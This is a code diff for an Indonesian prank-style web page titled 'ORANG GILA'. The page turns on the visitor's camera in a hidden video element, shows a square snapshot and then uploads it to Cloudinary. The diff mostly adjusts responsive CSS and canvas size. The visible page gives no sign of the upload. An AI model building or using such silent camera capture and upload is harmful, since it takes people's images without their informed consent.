@@ -18,17 +18,20 @@
         .container {
             text-align: center;
             background: white;
-            padding: 20px;
+            padding: 5vw;
             border-radius: 10px;
             box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
-        h1 { margin-bottom: 15px; }
+        h1 { margin-bottom: 3vw; font-size: 5vw; }
         #preview {
-            margin-top: 15px;
-            width: 300px; 
-            height: auto; 
+            margin-top: 3vw;
+            width: 90vw; /* Maksimal 90% dari layar */
+            max-width: 400px; /* Tapi tidak lebih dari 400px */
+            height: auto;
+            aspect-ratio: 1/1; /* Tetap persegi */
             border-radius: 10px;
             border: 2px solid black;
+            object-fit: cover; 
         }
     </style>
 </head>
@@ -36,7 +39,7 @@
     <div class="container">
         <h1>ORANG GILA :</h1>
         <video id="camera" autoplay playsinline style="display: none;"></video>
-        <canvas id="canvas" style="display: none;"></canvas>
+        <canvas id="canvas" width="400" height="400" style="display: none;"></canvas>
         <img id="preview">
     </div>
 
@@ -71,11 +74,9 @@
 
         function takePhoto() {
             console.log("Mengambil foto...");
-            canvas.width = 400;  // Resolusi lebih kecil agar lebih cepat
-            canvas.height = 600;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.drawImage(video, 0, 0, 400, 400);
 
-            preview.src = canvas.toDataURL("image/jpeg", 0.7);  // Ditampilkan langsung
+            preview.src = canvas.toDataURL("image/jpeg", 0.7);
 
             setTimeout(() => {
                 canvas.toBlob(uploadToCloudinary, "image/jpeg", 0.6);
